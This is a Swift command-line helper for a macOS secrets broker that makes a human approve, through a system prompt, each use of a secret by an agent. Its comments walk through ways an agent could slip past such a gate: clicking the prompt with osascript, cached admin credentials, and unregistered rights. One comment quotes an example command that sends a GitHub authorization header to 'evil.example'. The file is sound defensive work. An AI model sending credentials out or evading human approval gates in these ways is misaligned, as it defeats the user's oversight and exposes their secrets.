// sb-approve — asks the human to authorize one use of one secret.
//
// Uses Authorization Services rather than LocalAuthentication on purpose: the
// broker runs as a LaunchDaemon with no GUI session of its own, and only the
// system SecurityAgent can put a prompt in front of the console user from
// there. SecurityAgent renders in its own protected session, so an agent
// running as the user cannot read it or click it with osascript — and it
// cannot supply a fingerprint at all.
//
// The right is custom (registered by `sudo sb install`) rather than the
// built-in system.privilege.admin, which has timeout=300 and allow-root=true:
// with that right, one admin authentication anywhere on the system silently
// authorizes every use for the next five minutes, and a root caller is never
// prompted at all. dev.secretsbroker.approve is registered with timeout=0 and
// allow-root=false, so every use is authenticated afresh.
//
// usage: sb-approve <ref> <exec> [args...]
//
// With -export as the first argument, on success it prints a base64
// AuthorizationExternalForm to stdout. That form is how the daemon — which
// has no GUI session and cannot prompt — verifies that a human really
// authorized this use: it imports the form and re-checks the right WITHOUT
// interaction. This is Apple's client-authorizes / helper-verifies pattern.
// exit:  0 approved, 1 denied/cancelled, 2 internal error
import Foundation
import Security

var args = CommandLine.arguments
var exportForm = false
var hold = false
var requestNonce: String? = nil
while args.count > 1, args[1].hasPrefix("-") {
    if args[1] == "-export" { exportForm = true }
    // -request <nonce>: authorize ONE request's own right,
    // dev.secretsbroker.req.<nonce>, which root registered with the broker's
    // description of that request. The grant is then tied to the request by
    // the right's name, so it cannot be moved to a different one.
    if args[1] == "-request", args.count > 2 {
        requestNonce = args[2]
        args.remove(at: 2)
    }
    // -hold keeps this process (and therefore the authorization it created)
    // alive until stdin closes. An AuthorizationRef belongs to the process
    // that created it; a verifier in another process must import the form
    // while the creator still lives.
    if args[1] == "-hold" { hold = true }
    args.remove(at: 1)
}
guard requestNonce != nil || args.count >= 3 else {
    FileHandle.standardError.write(
        "usage: sb-approve <ref> <exec> [args...]  |  sb-approve -export -hold -request <nonce>\n"
            .data(using: .utf8)!)
    exit(2)
}
let ref = requestNonce == nil ? args[1] : ""
let exe = requestNonce == nil ? args[2] : ""
let argv = requestNonce == nil && args.count > 3 ? " " + args[3...].joined(separator: " ") : ""

let approvalRight = requestNonce.map { "dev.secretsbroker.req." + $0 } ?? "dev.secretsbroker.approve"

var authRef: AuthorizationRef?
let createStatus = AuthorizationCreate(nil, nil, [], &authRef)
guard createStatus == errAuthorizationSuccess, let auth = authRef else {
    var msg = "AuthorizationCreate failed: \(createStatus)\n"
    if createStatus == -60008 {
        // Empirically: a binary living in a TCC-protected folder (~/Documents,
        // ~/Desktop, ~/Downloads) cannot talk to Authorization Services.
        msg += "the helper cannot be run from a TCC-protected folder "
            + "(~/Documents, ~/Desktop, ~/Downloads).\n"
            + "install it with `sudo sb install`, or copy it somewhere else to test.\n"
    }
    FileHandle.standardError.write(msg.data(using: .utf8)!)
    exit(2)
}
// Rights are destroyed by the verifier after it checks them, not here: the
// external form must still reference a live authorization when the daemon
// imports it.
defer { AuthorizationFree(auth, []) }

// The prompt names what is being authorized. A human approving "the agent
// wants X for Y" is the entire point of the gate; a generic prompt trains
// people to approve reflexively.
// Naming the full command matters: "allow gh to use the GitHub password" and
// "allow gh api -H Authorization:… https://evil.example" are the same prompt
// otherwise, and the human cannot tell them apart.
let prompt = "secrets-broker: run\n\n  \(exe)\(argv)\n\nwith \(ref)?"

// An unregistered right does NOT fail — Authorization Services falls back to
// the system default rule, which can approve from a cached credential without
// prompting anyone. That would make this gate a no-op, so refuse to proceed
// unless the right is actually installed.
let rightExists: Bool = approvalRight.withCString { rightPtr -> Bool in
    var definition: CFDictionary?
    return AuthorizationRightGet(rightPtr, &definition) == errAuthorizationSuccess
}
guard rightExists else {
    FileHandle.standardError.write(
        "the approval right \(approvalRight) is not registered — run: sudo sb install\n"
            .data(using: .utf8)!)
    exit(2)
}

let status: OSStatus = approvalRight.withCString { rightPtr -> OSStatus in
    var item = AuthorizationItem(name: rightPtr, valueLength: 0, value: nil, flags: 0)
    return withUnsafeMutablePointer(to: &item) { itemPtr -> OSStatus in
        var rights = AuthorizationRights(count: 1, items: itemPtr)
        if requestNonce != nil {
            // No caller-supplied prompt. What the human reads is the
            // description root registered with this right.
            return AuthorizationCopyRights(auth, &rights, nil, [.interactionAllowed, .extendRights], nil)
        }
        return prompt.withCString { promptPtr -> OSStatus in
          // both pointers must outlive AuthorizationCopyRights, hence the nesting
          return kAuthorizationEnvironmentPrompt.withCString { namePtr -> OSStatus in
            var envItem = AuthorizationItem(
                name: namePtr,
                valueLength: strlen(promptPtr),
                value: UnsafeMutableRawPointer(mutating: promptPtr),
                flags: 0)
            return withUnsafeMutablePointer(to: &envItem) { envPtr -> OSStatus in
                var env = AuthorizationEnvironment(count: 1, items: envPtr)
                return AuthorizationCopyRights(
                    auth, &rights, &env,
                    [.interactionAllowed, .extendRights],
                    nil)
            }
          }
        }
    }
}
if status != errAuthorizationSuccess {
    // -60005 denied, -60006 cancelled by the user, -60007 interaction not
    // allowed (no session to draw the prompt in — the daemon case).
    let why: String
    switch status {
    case -60005: why = "denied"
    case -60006: why = "cancelled by the user"
    case -60007: why = "interaction not allowed — no GUI session to prompt in"
    default:     why = "AuthorizationCopyRights failed"
    }
    FileHandle.standardError.write(
        "sb-approve: \(why) (status \(status))\n".data(using: .utf8)!)
}
func waitForStdinClose() {
    while let _ = readLine(strippingNewline: true) {}
}

if status == errAuthorizationSuccess && exportForm {
    var form = AuthorizationExternalForm()
    let e = AuthorizationMakeExternalForm(auth, &form)
    if e != errAuthorizationSuccess {
        FileHandle.standardError.write("sb-approve: cannot export authorization (\(e))\n".data(using: .utf8)!)
        exit(2)
    }
    let bytes = withUnsafeBytes(of: form.bytes) { Data($0) }
    FileHandle.standardOutput.write((bytes.base64EncodedString() + "\n").data(using: .utf8)!)
}
if status == errAuthorizationSuccess && hold {
    waitForStdinClose()
}
exit(status == errAuthorizationSuccess ? 0 : 1)
